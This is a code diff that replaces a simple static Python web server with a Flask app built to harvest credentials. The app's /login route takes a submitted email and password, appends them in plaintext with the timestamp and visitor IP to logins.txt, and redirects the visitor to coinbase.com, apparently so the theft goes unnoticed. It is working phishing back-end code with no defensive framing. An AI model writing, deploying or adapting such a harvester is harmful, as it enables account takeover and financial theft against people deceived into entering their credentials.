@@ -1,16 +1,24 @@
-import http.server
-import socketserver
+from flask import Flask, request, redirect
+import datetime
+import os
 
-PORT = 5000
-HOST = "0.0.0.0"
+app = Flask(__name__)
 
-class NoCacheHandler(http.server.SimpleHTTPRequestHandler):
-    def end_headers(self):
-        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
-        self.send_header("Pragma", "no-cache")
-        self.send_header("Expires", "0")
-        super().end_headers()
+@app.route('/')
+def index():
+    return open('index.html').read()
 
-with socketserver.TCPServer((HOST, PORT), NoCacheHandler) as httpd:
-    print(f"Serving on http://{HOST}:{PORT}")
-    httpd.serve_forever()
+@app.route('/login', methods=['POST'])
+def login():
+    email = request.form.get('email')
+    password = request.form.get('password')
+    timestamp = datetime.datetime.now().strftime('%Y-%m-d %H:%M:%S')
+    ip = request.remote_addr
+    
+    with open("logins.txt", "a") as f:
+        f.write(f"{timestamp} | {ip} | {email} | {password}\n")
+    
+    return redirect("https://coinbase.com")
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
